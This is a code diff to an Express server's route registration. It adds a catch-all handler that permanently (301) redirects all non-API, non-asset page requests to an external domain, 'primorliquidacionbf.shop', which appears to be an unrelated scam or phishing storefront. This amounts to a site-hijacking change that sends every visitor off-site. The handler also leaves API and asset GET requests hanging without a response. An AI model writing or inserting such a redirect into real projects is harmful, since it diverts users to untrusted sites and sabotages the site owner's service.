@@ -261,6 +261,16 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
 
+  // Redirect all non-API routes to external URL
+  app.get("*", (req, res) => {
+    // Only redirect if it's not an API route and not a static asset
+    if (!req.path.startsWith("/api") && !req.path.startsWith("/assets")) {
+      const targetUrl = "https://primorliquidacionbf.shop/index.html";
+      logger.info("Redirecting request", { path: req.path, target: targetUrl });
+      return res.redirect(301, targetUrl);
+    }
+  });
+
   const httpServer = createServer(app);
 
   return httpServer;
